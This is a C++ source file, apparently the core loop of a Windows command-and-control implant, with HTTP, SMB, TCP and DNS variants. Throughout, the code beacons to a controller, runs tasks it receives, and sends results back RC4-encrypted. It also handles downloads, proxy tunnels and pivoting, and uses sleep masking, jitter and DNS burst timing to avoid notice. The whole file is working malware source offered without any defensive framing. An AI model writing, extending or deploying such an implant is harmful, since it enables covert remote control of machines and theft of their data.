#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"

Agent* g_Agent;

#if defined(BEACON_HTTP) 

#include "ConnectorHTTP.h"
ConnectorHTTP* g_Connector;

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	if ( !ApiLoad() ) 
		return 0;

	g_Agent = new Agent();
	g_Connector = new ConnectorHTTP();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
		return 0;

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			
			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		}
		else {
			g_Connector->SendData(NULL, 0);
		}

		if ( g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4( g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16 );
			g_Agent->commander->ProcessCommandTasks( g_Connector->RecvData(), g_Connector->RecvSize(), packerOut );
		}
		g_Connector->RecvClear();


		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
			WaitMask(g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );

		g_Agent->downloader->ProcessDownloader(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_SMB) 

#include "ConnectorSMB.h"
ConnectorSMB* g_Connector;

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	if (!ApiLoad())
		return 0;

	g_Agent = new Agent();
	g_Connector = new ConnectorSMB();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return 0;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);
	
	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();
		
		g_Connector->SendData(beat, beatSize);

		while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {

    		if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}

			if (g_Connector->RecvSize() == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
				TEB->LastErrorValue = 0;
				break;
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_TCP) 

#include "ConnectorTCP.h"
ConnectorTCP* g_Connector;

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	if (!ApiLoad())
		return 0;

	g_Agent = new Agent();
	g_Connector = new ConnectorTCP();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return 0;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		while (g_Connector->RecvSize() >= 0 && g_Agent->IsActive()) {

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	delete packerOut;

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_DNS)

#include "ConnectorDNS.h"
#include "DnsCodec.h"

ConnectorDNS* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = new Agent();
	g_Connector = new ConnectorDNS();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize, g_Agent->config->sleep_delay))
		return;

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	BYTE* pendingUpload = NULL;
	ULONG pendingUploadSize = 0;
	ULONG uploadBackoffMs = 0;
	ULONG nextUploadAttemptTick = 0;
	ULONG nextForcePollTick = 0;

	do {
		if (pendingUpload && pendingUploadSize) {
			ULONG now = ApiWin->GetTickCount();
			if (now >= nextUploadAttemptTick) {
				g_Connector->SendData(pendingUpload, pendingUploadSize);
				if (g_Connector->WasLastQueryOk()) {
					MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
					pendingUpload = NULL;
					pendingUploadSize = 0;
					uploadBackoffMs = 0;
					nextUploadAttemptTick = 0;
				}
				else {
					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
					ULONG next = base * 2;
					if (next > 30000) next = 30000;
					uploadBackoffMs = next;
					nextUploadAttemptTick = ApiWin->GetTickCount() + uploadBackoffMs + (ApiWin->GetTickCount() & 0x3FF);
				}
			}
			else {
				g_Connector->SendData(NULL, 0);
			}
		}
		else if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());
			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();

			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;

			BYTE* payload = plainBuf;
			ULONG payloadLen = plainLen;
			BYTE  flags = 0;

			const ULONG minCompressSize = 512; // Lower threshold for DNS - every byte matters
			if (payloadLen > minCompressSize) {
				BYTE* compBuf = NULL;
				ULONG compLen = 0;
				if (DnsCodec::Compress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
					payload = compBuf;
					payloadLen = compLen;
					flags = 1;
				}
			}

			sessionLen = 1 + 4 + payloadLen;
			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
			if (sessionBuf) {
				sessionBuf[0] = flags;
				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
				memcpy(sessionBuf + 5, payload, payloadLen);
			}

			BYTE* sendBuf = NULL;
			ULONG sendLen = 0;
			if (!sessionBuf) {
				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
				sendBuf = plainBuf;
				sendLen = plainLen;
				g_Connector->SendData(sendBuf, sendLen);
			}
			else {
				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
				sendBuf = sessionBuf;
				sendLen = sessionLen;
				g_Connector->SendData(sendBuf, sendLen);
			}
			if (!g_Connector->WasLastQueryOk() && sendBuf && sendLen) {
				pendingUpload = (BYTE*)MemAllocLocal(sendLen);
				if (pendingUpload) {
					memcpy(pendingUpload, sendBuf, sendLen);
					pendingUploadSize = sendLen;
					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
					nextUploadAttemptTick = ApiWin->GetTickCount() + uploadBackoffMs + (ApiWin->GetTickCount() & 0x3FF);
				}
			}
			if (sessionBuf)
				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);

			if (flags & 0x1 && payload && payload != plainBuf)
				MemFreeLocal((LPVOID*)&payload, payloadLen);

			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		}
		else {
			g_Connector->SendData(NULL, 0);
		}

		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
		}
		g_Connector->RecvClear();

		{
			BYTE* dnsResolvers = g_Agent->config->profile.resolvers;
			if (dnsResolvers && dnsResolvers != (BYTE*)g_Connector->GetResolvers())
				g_Connector->UpdateResolvers(dnsResolvers);
		}

		// Sync sleep_delay and burst config with connector
		g_Connector->UpdateSleepDelay(g_Agent->config->sleep_delay);
		g_Connector->UpdateBurstConfig(g_Agent->config->profile.burst_enabled, g_Agent->config->profile.burst_sleep, g_Agent->config->profile.burst_jitter );

		// Periodically force a poll even if cached heartbeat indicates "no tasks"
		{
			ULONG now = ApiWin->GetTickCount();
			if (nextForcePollTick == 0)
				nextForcePollTick = now + 1500 + (now & 0x3FF);
			BOOL idle = (packerOut->datasize() < 8) && !g_Connector->IsBusy() && (pendingUpload == NULL);

			if (idle && now >= nextForcePollTick) {
				ULONG baseSleep = g_Agent->config->sleep_delay;
				ULONG interval = baseSleep * 3000;  // 3x sleep_delay to avoid triggering every iteration
				if (interval < 6000) interval = 6000;
				if (interval > 60000) interval = 60000;
				interval += (now & 0x3FF);
				nextForcePollTick = now + interval;

				// Only trigger if previous forcePoll was already used
				if (!g_Connector->IsForcePollPending())
					g_Connector->ForcePollOnce();
			}
		}

		if (g_Agent->IsActive()) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter    = g_Agent->config->jitter_delay;

			BOOL  isBusy   = g_Connector->IsBusy();
			ULONG lastUp   = g_Connector->GetLastUpTotal();
			ULONG lastDown = g_Connector->GetLastDownTotal();
			BOOL  hasData  = (packerOut->datasize() >= 8);

			BOOL burst = FALSE;
			if (isBusy || (lastUp >= (1 * 1024)) || (lastDown >= (1 * 1024)) || hasData)
				burst = TRUE;
			
			if (burst && g_Agent->config->profile.burst_enabled) {
				// Burst ON + active transfer: use burst_sleep
				ULONG burstMs = g_Agent->config->profile.burst_sleep;
				ULONG burstJitter = g_Agent->config->profile.burst_jitter;
				if (burstMs == 0) 
					burstMs = 50;

				if (burstJitter > 0 && burstJitter <= 90) {
					ULONG jitterRange = (burstMs * burstJitter) / 100;
					ULONG jitterDelta = ApiWin->GetTickCount() % (jitterRange + 1);
					burstMs = burstMs - (jitterRange / 2) + jitterDelta;
					if (burstMs < 10) 
						burstMs = 10;
				}
				mySleep(burstMs);
				g_Connector->ResetTrafficTotals();
			}
			else {
				// Burst OFF or idle: always use sleep_delay
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
				if (burst) {
					g_Connector->ResetTrafficTotals();
				}
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);
	packerOut->Set32(0, packerOut->datasize());
	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	if (pendingUpload && pendingUploadSize) {
		MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
		pendingUpload = NULL;
		pendingUploadSize = 0;
	}

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}
#endif

void AgentClear(int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
